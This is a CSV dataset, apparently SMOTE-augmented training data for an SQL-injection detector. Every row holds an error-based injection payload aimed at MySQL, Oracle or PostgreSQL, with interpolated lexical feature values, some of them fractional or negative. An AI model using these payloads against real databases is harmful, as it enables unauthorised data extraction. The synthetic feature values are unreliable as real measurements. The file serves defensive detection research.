id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000123,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",nearest_attack_euclidean,R000190,1.907499266985581,162.21489153006473,31.378510846993528,3.8461711050720697,58.700848142090635,23.621489153006475,60.27106508196116,19.621489153006472,0.36092785502250935,0.1456599398624313,0.37243331382691525,0.12097889128814411,2.4859566120258947,0.0,0.0,0.0,0.0,0.0,0.0,12.757021693987053,0.0,0.0,4.0,0.0,0.6214891530064737,0.0,0.0,0.37851084699352633,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,2.6214891530064737
SMOTE_000124,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000205,0.7368914890253924,168.1078630784329,29.0,3.76003275849253,48.182585575979424,35.0,62.63482884804116,22.290448654412348,0.2869996362828669,0.20828702949364006,0.3722189471339454,0.1324943870895476,0.0,4.0,0.0,0.0,0.0,1.763482884804116,0.0,11.526965769608232,0.0,0.0,5.0,1.763482884804116,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.236517115195884,0.763482884804116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000125,attack,error,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000198,0.05105228500109323,164.8635308421491,27.047316758473926,3.607444974980937,39.35487568855443,35.02365837923696,65.41402163664685,25.07097513771089,0.23843578033547164,0.21273686309353818,0.39664428433854043,0.15218307223244976,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.070975137710887,2.0,0.0,5.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.988170810381519,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.011829189618481173,0.011829189618481173,4.0118291896184815
SMOTE_000126,attack,error,-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,nearest_attack_euclidean,R000028,0.6565203144762137,358.73966659613495,33.0,3.503290621564079,88.54422520425635,55.10699098336595,155.98145942514674,59.10699098336595,0.24672133589062667,0.15370195988367388,0.4347027409268207,0.16487396329887874,0.0,0.0,1.0,0.0,0.0,2.776747745841486,0.0,31.553495491682973,0.0,2.330243237524458,0.2232522541585138,23.776747745841487,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7767477458414861,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.776747745841486
SMOTE_000127,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000004,0.10812214698481269,218.43558949944662,42.0,4.348243447895925,120.43558949944662,2.0,71.0,25.0,0.5513447584155791,0.009156229420090228,0.3250461444132029,0.1144528677511278,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.145196499815539,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000128,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000004,2.384185791015625e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000129,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000033,1.368321140544995,210.78594388038707,30.952431973419348,3.6290227656085574,58.90486394683869,34.6032426312258,87.97621598670968,29.3016213156129,0.27888269280643624,0.1637058413103728,0.4184318066436439,0.13897965923954705,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,4.3016213156128975,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.3254053289032245,3.3254053289032246,0.0,0.32540532890322443,1.3254053289032244,1.6745946710967754,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.650810657806449
SMOTE_000130,attack,error,-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000247,1.040782609083633,425.4623343107834,33.46233431078338,3.4883298566619736,105.0,62.0,187.0,71.46233431078338,0.2467906926118075,0.1457240280184006,0.4395224716038857,0.1679628077659062,0.0,0.46233431078338033,3.0,0.0,0.0,3.0,0.0,39.0,0.0,0.0,0.0,32.0,0.0,0.4623343107833803,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000131,attack,error,"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000017,0.8806801035205943,402.6549082213463,34.52875764822114,3.529152839164575,99.64934823122601,61.235621175889435,174.20964352272844,67.56029529150244,0.24732769699429283,0.1524621716793666,0.4324913344237345,0.16771879690260605,0.0,1.0,3.0,0.0,0.0,3.0,0.0,35.7068635276683,0.0,0.0,0.38218941205528445,29.706863527668297,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.6178105879447156,0.0,1.0,1.6178105879447156,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.235621175889431
SMOTE_000132,attack,error,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000072,0.2411762053060296,273.9855308107277,36.0,3.9551209543903987,100.0,35.0,101.78842464858216,37.19710616214554,0.36510049016062535,0.12778517155621885,0.3713720245514258,0.13574231373172996,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.19710616214554,2.0,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000133,attack,error,"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000174,0.4772938746157436,184.35060430932072,38.78630869915266,4.081092326100336,65.74791955296568,31.106845650423672,65.85476520338935,21.641073902542015,0.356693925838556,0.1688907879440898,0.3572176790269073,0.11719760719044688,1.3205369512710066,0.0,0.0,0.0,0.0,1.0,0.0,13.106845650423669,0.0,0.0,4.0,2.3205369512710057,1.0,0.0,0.0,0.8931543495763311,0.0,1.0,1.0,0.0,0.0,1.0,0.10684565042366892,1.0,0.0,1.0,0.106845650423669,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.106845650423669
SMOTE_000134,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,1.254602599671007,189.98118379819402,28.53773783839208,3.485590385190725,49.915116222312854,32.0,82.37737838392079,25.688689191960385,0.2619793082810116,0.16923385796742213,0.4338396558030242,0.13494717794854202,2.6132135151762332,0.0,0.0,0.0,1.0,1.537737838392078,0.0,15.53773783839208,0.0,0.0,4.0,2.5377378383920774,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.537737838392078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.5377378383920774
SMOTE_000135,attack,error,"1   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  2230  =  2230",nearest_attack_euclidean,R000065,0.05800107455375919,220.16378361544912,28.08362163845509,3.2623003569643023,46.0,40.0,106.33102689235929,27.832756723089823,0.20896969727626133,0.18171278024022722,0.4829111984808035,0.12640632400270796,0.0,0.0,0.0,0.0,1.0,2.0,0.0,19.832756723089823,0.0,0.0,4.0,3.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000136,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000238,0.18159136858796637,168.74119192612645,28.874119192612646,3.7434377619959283,46.622357577837946,35.503523229549415,63.74119192612647,22.874119192612646,0.276285469400901,0.2106491629268005,0.37749357177364995,0.13557179589864857,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.748238385225294,0.0,0.0,5.125880807387354,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000137,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000081,1.354763037148085,185.5171355327445,29.42455242699133,3.5315632636151824,50.27365728097399,32.0,78.8189258247792,24.424552426991333,0.269519071341222,0.17377552891532252,0.4252319888270854,0.13147341091637005,2.454731456194798,0.0,0.0,0.0,1.0,1.0,0.0,14.969820970796533,0.0,0.0,4.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.48491048539826614,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.484910485398267
SMOTE_000138,attack,error,"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R000040,0.3842023768996324,357.52125518946946,35.0,3.6674586663165782,97.76585755085732,53.63832641404076,146.95748962106114,59.15958160351019,0.27341294739365785,0.15004244496958624,0.4110683612139221,0.16547624642283384,0.0,1.0,2.0,0.0,0.0,3.0,0.0,29.319163207020384,0.0,2.5212551894694246,0.1595816035101918,25.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000139,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cgbf' like 'cgbf",nearest_attack_euclidean,R000063,0.14974356511195547,350.2300083075738,35.827493769319624,3.6438745863064503,96.23000830757383,48.76999169242617,146.1150041537869,59.11500415378691,0.2747572405982547,0.13925929528069445,0.4171966928242102,0.16878677129684072,4.0,0.0,0.0,0.0,0.0,2.057502076893458,0.0,30.0,0.0,0.1725062306803754,0.9424979231065413,22.057502076893456,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000140,attack,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'xazf'  =  'xazf,nearest_attack_euclidean,R000244,0.17076855926693418,365.0222985544643,31.11358872827381,3.3299165165373625,86.17038309241072,45.17038309241072,170.56794364136906,63.11358872827381,0.23607748237985135,0.12374155694930246,0.46726986890282063,0.17291109176802555,4.0,0.0,0.056794364136906306,0.0,0.0,2.9432056358630936,0.0,34.11358872827381,0.0,0.0,0.0,23.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.9432056358630931,0.05679436413690658,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000141,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000054,0.7800342775355315,202.56356806789978,31.7449814683237,3.6373439806735646,52.2617099072447,40.7449814683237,84.04683962897879,25.5100370633526,0.2585407130955673,0.20319327013035765,0.41256357913588765,0.1257024376381874,0.0,1.0,2.0,0.0,0.7516728438920997,2.0,0.0,14.7583642194605,0.0,0.0,4.248327156107901,4.751672843892099,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.5033456877841993,0.0,1.0,0.7516728438920997,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.255018531676299
SMOTE_000142,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000146,0.9138539668528216,233.71948602642613,32.71948602642611,3.8786455646260114,79.87794410570444,42.75588821140888,85.52462576216502,25.561027947147778,0.34175489807039955,0.1829078348241169,0.3659631907881818,0.10937407631730178,2.561027947147781,0.0,0.0,0.0,0.0,2.0,0.0,14.561027947147782,0.0,0.0,5.0,3.43897205285222,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7194860264261096,0.0,0.7194860264261096,0.0,0.2805139735738904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.719486026426109
SMOTE_000143,attack,error,"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000164,0.5494516985588239,136.03663939128066,24.414655756512268,3.6204583882475445,34.0,35.829311513024535,49.0,17.207327878256134,0.24998699792044743,0.26326321034727457,0.360275379355939,0.12647441237633897,0.20732787825613475,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.20732787825613472,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.20732787825613475,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,2.2073278782561347
SMOTE_000144,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",nearest_attack_euclidean,R000309,0.00024921322824873597,184.9983719444844,28.999918597224223,3.627387766969577,47.99934877779377,35.0,76.99902316669065,25.0,0.2594580727455068,0.1891910559195101,0.4162144028210474,0.1351364685139358,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.999837194448443,0.00016280555155795406,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000145,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000237,0.23071717894056154,227.46717199854288,31.077861999757147,3.7111737975560644,69.62289599805717,37.0,92.0,28.844276000485706,0.30602867262217615,0.16266878365041146,0.40447373231994205,0.1268288114074703,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,1.8442760004857066,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.0
SMOTE_000146,attack,error,"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",nearest_attack_euclidean,R000295,0.19515403855054156,380.73425596750417,32.93972647464306,3.335392593864608,88.27671769571668,48.0,179.39726474643055,65.06027352535695,0.2317976343972959,0.12609502192542382,0.47118670547914987,0.17092063819813041,0.0,4.0,1.0,0.0,0.0,2.060273525356943,0.0,35.87945294928611,0.12054705071388594,0.0,0.0,23.06027352535694,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
